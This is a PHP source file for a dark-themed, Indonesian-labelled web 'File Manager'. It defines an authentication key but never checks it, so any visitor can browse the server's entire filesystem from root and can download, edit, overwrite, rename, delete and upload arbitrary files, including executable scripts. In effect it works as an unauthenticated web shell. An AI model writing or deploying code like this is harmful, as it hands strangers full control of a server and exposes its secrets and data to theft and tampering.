<?php
session_start();

// ============================================================
//  KONFIGURASI
// ============================================================
define('FM_SESSION_KEY', 'fm_auth_v1');
// ============================================================

// CSRF token init
if (empty($_SESSION['fm_csrf'])) {
    $_SESSION['fm_csrf'] = bin2hex(random_bytes(16));
}

function safePath($path) {
    if (empty($path)) {
        return PHP_OS_FAMILY === 'Windows' ? substr(realpath(__DIR__), 0, 3) : '/';
    }
    $real = realpath($path);
    return $real !== false ? $real : (PHP_OS_FAMILY === 'Windows' ? substr(realpath(__DIR__), 0, 3) : '/');
}

function csrfToken() {
    return $_SESSION['fm_csrf'] ?? '';
}
function verifyCsrf() {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== csrfToken()) {
        die('Invalid CSRF token.');
    }
}

// --- Navigasi ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['nav_path'])) {
    verifyCsrf();
    $_SESSION['fm_path'] = safePath($_POST['nav_path']);
} elseif (!isset($_SESSION['fm_path'])) {
    $_SESSION['fm_path'] = __DIR__;
}
$currentFull = $_SESSION['fm_path'];

$message = '';

// --- Upload ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload'])) {
    verifyCsrf();
    $fileName = basename($_FILES['fileToUpload']['name']);
    $target   = $currentFull . DIRECTORY_SEPARATOR . $fileName;
    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target)) {
        $message = "Berhasil upload: " . htmlspecialchars($fileName);
    } else {
        $message = "ERROR: Upload gagal.";
    }
}

// --- Delete ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    verifyCsrf();
    $delTarget = safePath($_POST['delete_file']);
    if ($delTarget && is_file($delTarget)) {
        unlink($delTarget)
            ? $message = "Dihapus: " . htmlspecialchars(basename($delTarget))
            : $message = "ERROR: Gagal hapus.";
    } else {
        $message = "ERROR: File tidak ditemukan.";
    }
}

// --- Rename ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rename_old'], $_POST['rename_new'])) {
    verifyCsrf();
    $oldPath = safePath($_POST['rename_old']);
    $newName = basename($_POST['rename_new']);
    if ($oldPath && $newName) {
        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
        rename($oldPath, $newPath)
            ? $message = "Direname ke: " . htmlspecialchars($newName)
            : $message = "ERROR: Rename gagal.";
    }
}

// --- Mkdir ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['mkdir_name'])) {
    verifyCsrf();
    $dirName = basename($_POST['mkdir_name']);
    if ($dirName) {
        $newDir = $currentFull . DIRECTORY_SEPARATOR . $dirName;
        if (file_exists($newDir)) {
            $message = "ERROR: Sudah ada.";
        } elseif (mkdir($newDir, 0755)) {
            $message = "Folder dibuat: " . htmlspecialchars($dirName);
        } else {
            $message = "ERROR: Mkdir gagal.";
        }
    }
}

// --- Edit file (read) ---
$editFile = '';
$editContent = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file'])) {
    verifyCsrf();
    $ef = safePath($_POST['edit_file']);
    if ($ef && is_file($ef)) {
        $editFile    = $ef;
        $editContent = file_get_contents($ef);
    }
}
// --- Edit file (save) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_file'], $_POST['save_content'])) {
    verifyCsrf();
    $sf = safePath($_POST['save_file']);
    if ($sf && is_file($sf)) {
        file_put_contents($sf, $_POST['save_content']);
        $message = "Disimpan: " . htmlspecialchars(basename($sf));
    }
}

// --- Download ---
if (isset($_GET['download'])) {
    $dlFile = safePath($_GET['download']);
    if ($dlFile && is_file($dlFile)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dlFile) . '"');
        header('Content-Length: ' . filesize($dlFile));
        readfile($dlFile);
        exit;
    }
}

// --- List direktori ---
$items = [];
if (is_dir($currentFull)) {
    foreach (scandir($currentFull) as $entry) {
        if ($entry === '.') continue;
        $full = $currentFull . DIRECTORY_SEPARATOR . $entry;
        $items[] = [
            'name'     => $entry,
            'full'     => $full,
            'is_dir'   => is_dir($full),
            'size'     => is_file($full) ? @filesize($full) : null,
            'modified' => ($t = @filemtime($full)) ? date('Y-m-d H:i', $t) : '-',
        ];
    }
    usort($items, fn($a, $b) =>
        $b['is_dir'] <=> $a['is_dir'] ?: strcmp($a['name'], $b['name'])
    );
}

function formatSize($bytes) {
    if ($bytes === null) return '-';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)    return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

$parentDir = dirname($currentFull);
$isRoot    = ($parentDir === $currentFull);
$csrf      = csrfToken();

function navForm($path, $label, $class = '', $csrf = '') {
    echo '<form method="post" style="display:inline;margin:0">';
    echo '<input type="hidden" name="nav_path" value="' . htmlspecialchars($path) . '">';
    echo '<input type="hidden" name="csrf_token" value="' . htmlspecialchars($csrf) . '">';
    echo '<button type="submit" class="nav ' . $class . '">' . htmlspecialchars($label) . '</button>';
    echo '</form>';
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 24px; font-size: 13px; }
        h2 { color: #569cd6; font-size: 15px; margin-bottom: 14px; letter-spacing: 1px; text-transform: uppercase; }
        .topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; }
        .breadcrumb { color: #9cdcfe; font-size: 12px; display: flex; flex-wrap: wrap; align-items: center; gap: 2px; }
        .breadcrumb span.sep { color: #444; margin: 0 2px; }
        .current-path { font-size: 11px; color: #555; margin-bottom: 16px; }
        .current-path code { color: #606060; }
        .message { margin-bottom: 12px; padding: 7px 12px; border-left: 3px solid #569cd6; background: #252526; font-size: 12px; color: #9cdcfe; }
        .message.err { border-color: #f44747; color: #f44747; }
        table { width: 100%; border-collapse: collapse; }
        thead tr { border-bottom: 1px solid #2d2d2d; }
        th { padding: 7px 10px; text-align: left; color: #555; font-weight: normal; font-size: 11px; text-transform: uppercase; letter-spacing: 0.8px; }
        td { padding: 5px 10px; border-bottom: 1px solid #252526; vertical-align: middle; }
        tr:hover td { background: #252526; }
        .name-cell { display: flex; align-items: center; gap: 8px; }
        .icon { color: #444; width: 14px; text-align: center; font-style: normal; font-size: 11px; }
        .filename { color: #d4d4d4; }
        .meta { color: #555; font-size: 12px; }
        button.nav { background: transparent; border: none; padding: 0; font-family: monospace; font-size: 13px; cursor: pointer; color: #dcdcaa; }
        button.nav:hover { text-decoration: underline; }
        button.nav.bc { color: #9cdcfe; font-size: 12px; }
        button.nav.up { color: #569cd6; font-size: 12px; }
        .actions { display: flex; gap: 5px; align-items: center; flex-wrap: wrap; }
        .rename-form { display: flex; gap: 4px; align-items: center; }
        input[type=text] { background: #2d2d2d; border: 1px solid #3e3e3e; color: #d4d4d4; padding: 3px 7px; border-radius: 2px; font-family: monospace; font-size: 12px; width: 150px; }
        input[type=text]:focus { outline: none; border-color: #569cd6; }
        button.act { background: transparent; color: #606060; border: 1px solid #3e3e3e; padding: 3px 9px; cursor: pointer; border-radius: 2px; font-size: 11px; font-family: monospace; }
        button.act:hover { color: #d4d4d4; border-color: #569cd6; background: #252526; }
        button.act.del { color: #5a2a2a; border-color: #3e2020; }
        button.act.del:hover { color: #f44747; border-color: #f44747; background: #2a1a1a; }
        .bottom-section { display: flex; gap: 10px; margin-top: 24px; flex-wrap: wrap; }
        .panel { flex: 1; min-width: 240px; padding: 14px 16px; background: #252526; border: 1px solid #2d2d2d; border-radius: 2px; }
        .panel-label { display: block; font-size: 11px; color: #555; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 10px; }
        .panel-row { display: flex; gap: 8px; align-items: center; }
        input[type=file] { color: #606060; font-size: 12px; font-family: monospace; background: #2d2d2d; border: 1px solid #3e3e3e; padding: 4px 8px; border-radius: 2px; flex: 1; }
        input[type=file]::file-selector-button { background: #2d2d2d; color: #606060; border: 1px solid #3e3e3e; padding: 3px 10px; cursor: pointer; font-family: monospace; font-size: 11px; margin-right: 8px; }
        input[type=file]::file-selector-button:hover { color: #d4d4d4; }
        button.primary { background: #0e639c; color: #fff; border: 1px solid #0e639c; padding: 5px 14px; font-size: 12px; font-family: monospace; cursor: pointer; border-radius: 2px; }
        button.primary:hover { background: #1177bb; }
        .editor-overlay { display:none; position:fixed; top:0;left:0;right:0;bottom:0; background:rgba(0,0,0,.7); z-index:100; align-items:center; justify-content:center; }
        .editor-overlay.open { display:flex; }
        .editor-box { background:#1e1e1e; border:1px solid #3e3e3e; border-radius:3px; width:90%; max-width:860px; display:flex; flex-direction:column; max-height:88vh; }
        .editor-header { padding:10px 16px; border-bottom:1px solid #2d2d2d; display:flex; justify-content:space-between; align-items:center; font-size:12px; color:#9cdcfe; }
        textarea.editor { flex:1; background:#1e1e1e; color:#d4d4d4; border:none; padding:14px 16px; font-family:monospace; font-size:13px; resize:none; min-height:400px; outline:none; }
        .editor-footer { padding:10px 16px; border-top:1px solid #2d2d2d; display:flex; gap:8px; justify-content:flex-end; }
    </style>
</head>
<body>

<div class="topbar">
    <h2>// file manager</h2>
</div>

<!-- Breadcrumb -->
<div class="breadcrumb">
<?php
$sep   = DIRECTORY_SEPARATOR;
$parts = array_filter(explode($sep, $currentFull));
$built = PHP_OS_FAMILY === 'Windows' ? '' : '/';
$i = 0;
foreach ($parts as $part) {
    $built .= ($i === 0 && PHP_OS_FAMILY === 'Windows') ? $part . $sep : $part . $sep;
    $builtClean = rtrim($built, $sep);
    if ($i > 0) echo '<span class="sep">/</span>';
    navForm($builtClean, $part, 'bc', $csrf);
    $i++;
}
?>
</div>
<div class="current-path"><code><?= htmlspecialchars($currentFull) ?></code></div>

<?php if ($message): ?>
<div class="message <?= strpos($message, 'ERROR') === 0 ? 'err' : '' ?>">
    <?= htmlspecialchars($message) ?>
</div>
<?php endif; ?>

<table>
    <thead>
        <tr>
            <th style="width:36%">nama</th>
            <th style="width:8%">tipe</th>
            <th style="width:9%">ukuran</th>
            <th style="width:13%">diubah</th>
            <th>aksi</th>
        </tr>
    </thead>
    <tbody>
        <?php if (!$isRoot): ?>
        <tr>
            <td colspan="4">
                <div class="name-cell">
                    <i class="icon">^</i>
                    <?php navForm($parentDir, '..', 'up', $csrf) ?>
                </div>
            </td>
            <td></td>
        </tr>
        <?php endif; ?>

        <?php foreach ($items as $item): ?>
        <?php if ($item['name'] === '..') continue; ?>
        <tr>
            <td>
                <div class="name-cell">
                    <i class="icon"><?= $item['is_dir'] ? 'd' : 'f' ?></i>
                    <?php if ($item['is_dir']): ?>
                        <?php navForm($item['full'], $item['name'], '', $csrf) ?>
                    <?php else: ?>
                        <span class="filename"><?= htmlspecialchars($item['name']) ?></span>
                    <?php endif; ?>
                </div>
            </td>
            <td class="meta"><?= $item['is_dir'] ? 'dir' : 'file' ?></td>
            <td class="meta"><?= formatSize($item['size']) ?></td>
            <td class="meta"><?= $item['modified'] ?></td>
            <td>
                <div class="actions">
                    <form class="rename-form" method="post">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrf) ?>">
                        <input type="hidden" name="rename_old" value="<?= htmlspecialchars($item['full']) ?>">
                        <input type="text" name="rename_new" value="<?= htmlspecialchars($item['name']) ?>" required>
                        <button class="act" type="submit">[rename]</button>
                    </form>
                    <?php if (!$item['is_dir']): ?>
                    <a href="?download=<?= urlencode($item['full']) ?>">
                        <button class="act" type="button">[dl]</button>
                    </a>
                    <form method="post">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrf) ?>">
                        <input type="hidden" name="edit_file" value="<?= htmlspecialchars($item['full']) ?>">
                        <button class="act" type="submit">[edit]</button>
                    </form>
                    <form method="post" onsubmit="return confirm('Hapus <?= htmlspecialchars(addslashes($item['name'])) ?>?')">
                        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrf) ?>">
                        <input type="hidden" name="delete_file" value="<?= htmlspecialchars($item['full']) ?>">
                        <button class="act del" type="submit">[hapus]</button>
                    </form>
                    <?php endif; ?>
                </div>
            </td>
        </tr>
        <?php endforeach; ?>
    </tbody>
</table>

<div class="bottom-section">
    <div class="panel">
        <span class="panel-label">upload file</span>
        <div class="panel-path" style="font-size:11px;color:#444;margin-bottom:8px"><?= htmlspecialchars($currentFull) ?></div>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrf) ?>">
            <div class="panel-row">
                <input type="file" name="fileToUpload" required>
                <button class="primary" type="submit">[upload]</button>
            </div>
        </form>
    </div>
    <div class="panel">
        <span class="panel-label">buat folder</span>
        <div class="panel-path" style="font-size:11px;color:#444;margin-bottom:8px"><?= htmlspecialchars($currentFull) ?></div>
        <form method="post">
            <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrf) ?>">
            <div class="panel-row">
                <input type="text" name="mkdir_name" placeholder="nama folder" required style="flex:1;width:auto">
                <button class="primary" type="submit">[mkdir]</button>
            </div>
        </form>
    </div>
</div>

<?php if ($editFile): ?>
<div class="editor-overlay open" id="editorOverlay">
    <div class="editor-box">
        <div class="editor-header">
            <span><?= htmlspecialchars(basename($editFile)) ?></span>
            <button class="act" onclick="document.getElementById('editorOverlay').classList.remove('open')">[×]</button>
        </div>
        <form method="post" style="display:contents">
            <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrf) ?>">
            <input type="hidden" name="save_file" value="<?= htmlspecialchars($editFile) ?>">
            <textarea class="editor" name="save_content"><?= htmlspecialchars($editContent) ?></textarea>
            <div class="editor-footer">
                <button class="act" type="button" onclick="document.getElementById('editorOverlay').classList.remove('open')">[batal]</button>
                <button class="primary" type="submit">[simpan]</button>
            </div>
        </form>
    </div>
</div>
<?php endif; ?>

</body>
</html>